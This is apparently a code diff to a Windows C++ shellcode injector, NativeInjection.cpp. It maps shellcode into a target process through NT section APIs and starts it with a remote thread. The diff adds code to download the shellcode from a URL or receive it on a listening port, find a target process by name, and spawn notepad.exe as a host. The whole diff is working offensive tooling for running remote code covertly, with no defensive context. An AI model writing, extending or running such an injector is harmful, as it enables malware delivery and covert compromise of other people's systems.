@@ -1,6 +1,9 @@
 // NativeInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include "NTAPIs.hpp"
+#include "Download_shellcode.h"
+#include "arg_parser.h"
+#include "listener.h"
 
 HANDLE MyNtOpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId)
 {
@@ -51,10 +54,9 @@ BOOL InitializeNTAPIs()
 	return TRUE;
 }
 
-HANDLE injectShellcode(DWORD pid)
+HANDLE injectShellcode(const char* shellcode, SIZE_T size, DWORD pid)
 {
-	// Get size of shellcode
-	SIZE_T size = sizeof(shellcode);
+	printf("[*] The shellcode size is: %d\n", size);
 
 	// Init variables
 	LARGE_INTEGER sectionSize = { size };
@@ -85,7 +87,7 @@ HANDLE injectShellcode(DWORD pid)
 	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);
 
 	// Copy shellcode to the local view, which will get reflected in the target process's mapped view
-	memcpy(localSectionAddress, shellcode, sizeof(shellcode));
+	memcpy(localSectionAddress, shellcode, size);
 	printf("[+] Copied to local view\n");
 
 	// Attempting to create remote thread on the remote process in order to trigger the shellcode
@@ -100,9 +102,95 @@ HANDLE injectShellcode(DWORD pid)
 	return targetThreadHandle;
 }
 
+DWORD findProcess(char *process)
+{
+	DWORD pid = 0;
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	if (Process32First(snapshot, &entry) == TRUE)
+	{
+		while (Process32Next(snapshot, &entry) == TRUE)
+		{
+			if (strcmp(entry.szExeFile, process) == 0)
+			{
+				// Found
+				pid = entry.th32ProcessID;
+				printf("[+] Found PID: %d\n", pid);
+			}
+		}
+	}
+
+	CloseHandle(snapshot);
+	
+	if (pid == 0)
+	{
+		printf("[-] %s not found\n", process);
+		exit(-1);
+	}
+	return pid;
+}
+
 int main(int argc, char ** argv)
 {
-	DWORD pid = atoi(argv[1]);
-	injectShellcode(pid);
+	DWORD pid = 0;
+	char* url, *port, * shellcode;
+	int shellcode_size = 0;
+
+	if (cmdOptionExists(argv, argv + argc, "-h") || // Help
+		(!cmdOptionExists(argv, argv + argc, "-u") && !cmdOptionExists(argv, argv + argc, "-l")) || // Incase listen mode and url not given
+		(cmdOptionExists(argv, argv + argc, "-u") && cmdOptionExists(argv, argv + argc, "-l"))) // Incase both given
+	{
+		printf("Usage:\n"
+			"\tInjector.exe -u <URL>\n"
+			"\tInjector.exe -p <PID/Process Name> -u <URL>\n"
+			"\tInjector.exe -p <PID/Process Name> -l <LISTEN_PORT>\n"
+			"\tInjector.exe -h\n"
+			"Options:\n"
+			"\t-h \t Show this menu.\n"
+			"\t-u \t URL to donwload shellcode from (Not listen mode).\n"
+			"\t-p \t PID/Process name to be injected (Optional).\n"
+			"\t-l \t Listen mode port (Not download mode).\n"
+		);
+		return 1;
+	}
+
+	if (!cmdOptionExists(argv, argv + argc, "-p")) // Creates process incase PID not given
+	{
+		PROCESS_INFORMATION pi = { 0 };
+		STARTUPINFO si = { 0 };
+		si.cb = sizeof(STARTUPINFO);
+		const char notepad[] = "c:\\windows\\system32\\notepad.exe";
+		CreateProcessA(notepad, (LPSTR)notepad, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+		pid = pi.dwProcessId;
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
+	else
+	{
+		pid = atoi(getCmdOption(argv, argv + argc, "-p"));
+		if (pid == 0)
+			pid = findProcess(getCmdOption(argv, argv + argc, "-p"));
+	}
+
+	if (cmdOptionExists(argv, argv + argc, "-u")) // Download shellcode from URL
+	{
+		url = getCmdOption(argv, argv + argc, "-u");
+		string downloaded_shellcode = download(url);
+		shellcode = (char*)downloaded_shellcode.c_str();
+		shellcode_size = downloaded_shellcode.size();
+	}
+	else
+	{
+		recv_shell r;
+		port = getCmdOption(argv, argv + argc, "-l");
+		r = start_listen(port);
+		shellcode = r.bufferReceivedBytes;
+		shellcode_size = r.receivedBytes;
+	}
+
+	// Inject
+	injectShellcode(shellcode, shellcode_size, pid);
 	return 0;
 }
